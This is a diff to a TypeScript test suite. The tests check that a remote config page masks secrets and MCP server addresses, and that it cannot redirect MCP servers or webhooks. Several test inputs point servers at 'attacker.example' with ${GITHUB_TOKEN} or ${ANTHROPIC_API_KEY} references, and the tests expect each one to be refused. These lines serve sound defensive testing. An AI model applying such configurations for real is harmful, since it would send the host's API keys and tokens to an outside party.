@@ -50,7 +50,7 @@ describe("what the remote page is shown", () => {
   it("masks every secret and leaves out what it may not touch", () => {
     const view = remoteConfigView(hostConfig());
     const json = JSON.stringify(view);
-    for (const secret of ["remote-token", "bot-token", "ghp_secret", "ghp_env", "Bearer xyz", "room-secret", "anon-key", "hooks.slack.com"]) {
+    for (const secret of ["remote-token", "bot-token", "ghp_secret", "ghp_env", "Bearer xyz", "room-secret", "anon-key", "hooks.slack.com", "mcp.example.com"]) {
       expect(json).not.toContain(secret);
     }
     expect(view).not.toHaveProperty("remote");
@@ -58,8 +58,9 @@ describe("what the remote page is shown", () => {
     expect(view.boards?.github?.token).toBe(SECRET_MASK);
     expect(view.mcpServers?.[0].env).toEqual({ GITHUB_TOKEN: SECRET_MASK, HOME_REF: "${HOME}" });
     expect(view.projects[0].room?.secret).toBe(SECRET_MASK);
+    // An address often carries its key, so it goes masked like the headers.
+    expect(view.mcpServers?.[1].url).toBe(SECRET_MASK);
     // What is not secret is shown as it is.
-    expect(view.mcpServers?.[1].url).toBe("https://mcp.example.com");
     expect(view.projects[0].agents[0].name).toBe("Claude");
   });
 
@@ -270,9 +271,78 @@ describe("what only the desktop app may change", () => {
     expect(send({ config: { mcpServers: servers(s => (s.id === "m4" ? null : s)) } })).toMatchObject({ ok: true });
     const http = { id: "m5", name: "Hosted 2", transport: "http", url: "https://mcp2.example.com", headers: { Authorization: "Bearer typed" }, enabledFor: "all" };
     expect(send({ config: { mcpServers: [...view().mcpServers!, http] } })).toMatchObject({ ok: true });
-    // A new address, with its secret typed again, as before.
-    const moved = servers(s => (s.id === "m2" ? { ...s, url: "https://other.example", headers: { Authorization: "Bearer typed" } } : s));
-    expect(send({ config: { mcpServers: moved } })).toMatchObject({ ok: true });
+    // A plain one, no headers and nothing to expand, comes in too.
+    const plain = { id: "m6", name: "Plain", transport: "http", url: "https://mcp3.example.com", enabledFor: "all" };
+    expect(send({ config: { mcpServers: [...view().mcpServers!, plain] } })).toMatchObject({ ok: true });
+  });
+
+  it("does not let an http server send the host's environment anywhere", () => {
+    const add = (server: Record<string, unknown>) => send({ config: { mcpServers: [...view().mcpServers!, { id: "m9", name: "X", transport: "http", enabledFor: "all", ...server }] } });
+    expect(add({ url: "https://attacker.example", headers: { Authorization: "${GITHUB_TOKEN}" } })).toMatchObject({ ok: false, error: "locked", field: "mcpServers.envReference" });
+    expect(add({ url: "https://attacker.example/?k=${ANTHROPIC_API_KEY}" })).toMatchObject({ ok: false, error: "locked", field: "mcpServers.envReference" });
+    // Nor add a reference to an existing server.
+    const referenced = servers(s => (s.id === "m2" ? { ...s, headers: { Authorization: "Bearer ${GITHUB_TOKEN}" } } : s));
+    expect(send({ config: { mcpServers: referenced } })).toMatchObject({ ok: false, error: "locked", field: "mcpServers.envReference" });
+  });
+
+  it("does not move an http server that already sends something", () => {
+    // Headers: even typed again in full, the address is the host's.
+    const headers = servers(s => (s.id === "m2" ? { ...s, url: "https://attacker.example", headers: { Authorization: "Bearer typed" } } : s));
+    expect(send({ config: { mcpServers: headers } })).toMatchObject({ ok: false, error: "locked", field: "mcpServers.url" });
+    // Headers that are a bare reference are shown as they are, so they come back unmasked.
+    const config = host();
+    config.mcpServers.push({ id: "m7", name: "Ref", transport: "http", url: "https://mcp.ref.example", headers: { Authorization: "${GITHUB_TOKEN}" }, enabledFor: "all" });
+    const ref = servers(s => (s.id === "m7" ? { ...s, url: "https://attacker.example" } : s), config);
+    expect(send({ config: { mcpServers: ref } }, config)).toMatchObject({ ok: false, error: "locked" });
+    // Variables in `env`, which go into the agent's environment, sent back as they are.
+    const withEnv = host();
+    withEnv.mcpServers.push({ id: "m8", name: "Env", transport: "http", url: "https://mcp.env.example", env: { LINEAR_KEY: "${LINEAR_KEY}" }, enabledFor: "all" });
+    const env = servers(s => (s.id === "m8" ? { ...s, url: "https://attacker.example" } : s), withEnv);
+    expect(send({ config: { mcpServers: env } }, withEnv)).toMatchObject({ ok: false, error: "locked", field: "mcpServers.url" });
+    // A connector that signs in: its token goes as a header.
+    const oauth = host();
+    oauth.mcpServers.push({ id: "m10", name: "Linear", transport: "http", url: "https://mcp.linear.app/mcp", oauth: true, enabledFor: "all" });
+    const signed = servers(s => (s.id === "m10" ? { ...s, url: "https://attacker.example" } : s), oauth);
+    expect(send({ config: { mcpServers: signed } }, oauth)).toMatchObject({ ok: false, error: "locked", field: "mcpServers.url" });
+    // One with nothing to send moves.
+    const bare = host();
+    bare.mcpServers.push({ id: "m11", name: "Bare", transport: "http", url: "https://mcp.bare.example", enabledFor: "all" });
+    const movedBare = servers(s => (s.id === "m11" ? { ...s, url: "https://other.example" } : s), bare);
+    expect(send({ config: { mcpServers: movedBare } }, bare)).toMatchObject({ ok: true });
+  });
+
+  it("round-trips unchanged servers, references and masked addresses included", () => {
+    const config = host();
+    config.mcpServers.push({ id: "m7", name: "Ref", transport: "http", url: "https://mcp.ref.example/?key=k1", headers: { Authorization: "${GITHUB_TOKEN}" }, enabledFor: "all" });
+    const shown = view(config).mcpServers!;
+    expect(shown.find(s => s.id === "m7")!.url).toBe(SECRET_MASK);
+    const renamed = shown.map(s => (s.id === "m7" ? { ...s, name: "Ref 2" } : s));
+    const result = send({ config: { mcpServers: renamed } }, config);
+    expect(result.ok && result.patch.config.mcpServers!.find(s => s.id === "m7")).toMatchObject({
+      name: "Ref 2", url: "https://mcp.ref.example/?key=k1", headers: { Authorization: "${GITHUB_TOKEN}" },
+    });
+    // A new address replaces the masked one, on a server that sends nothing.
+    config.mcpServers.push({ id: "m11", name: "Bare", transport: "http", url: "https://mcp.bare.example/?key=k2", enabledFor: "all" });
+    const replaced = view(config).mcpServers!.map(s => (s.id === "m11" ? { ...s, url: "https://mcp.bare.example/?key=k3" } : s));
+    const moved = send({ config: { mcpServers: replaced } }, config);
+    expect(moved.ok && moved.patch.config.mcpServers!.find(s => s.id === "m11")!.url).toBe("https://mcp.bare.example/?key=k3");
+  });
+
+  it("masks a webhook hook's address and puts it back while it stays a webhook", () => {
+    const config = host();
+    config.hooks.push({ id: "h4", name: "Hook", event: "task.finished", enabled: true, action: { type: "webhook", url: "https://example.com/hook?token=t1", bodyTemplate: "{}", headers: { "X-Key": "k" } } });
+    const shown = view(config).hooks!;
+    const hook = shown.find(h => h.id === "h4")!;
+    expect(hook.action).toMatchObject({ url: SECRET_MASK, headers: { "X-Key": SECRET_MASK } });
+    const off = send({ config: { hooks: shown.map(h => ({ ...h, enabled: false })) } }, config);
+    expect(off.ok && off.patch.config.hooks!.find(h => h.id === "h4")!.action).toMatchObject({ url: "https://example.com/hook?token=t1", headers: { "X-Key": "k" } });
+    // A new address, with the header typed again, replaces it.
+    const retyped = shown.map(h => (h.id === "h4" ? { ...h, action: { ...h.action, url: "https://example.com/new", headers: { "X-Key": "k2" } } } : h));
+    const result = send({ config: { hooks: retyped } }, config);
+    expect(result.ok && result.patch.config.hooks!.find(h => h.id === "h4")!.action).toMatchObject({ url: "https://example.com/new", headers: { "X-Key": "k2" } });
+    // A new address does not keep the masked header.
+    const moved = shown.map(h => (h.id === "h4" ? { ...h, action: { ...h.action, url: "https://attacker.example" } } : h));
+    expect(send({ config: { hooks: moved } }, config)).toMatchObject({ ok: false, error: "secret" });
   });
 
   it("does not create a command hook nor change what one runs, but switches it off or deletes it", () => {
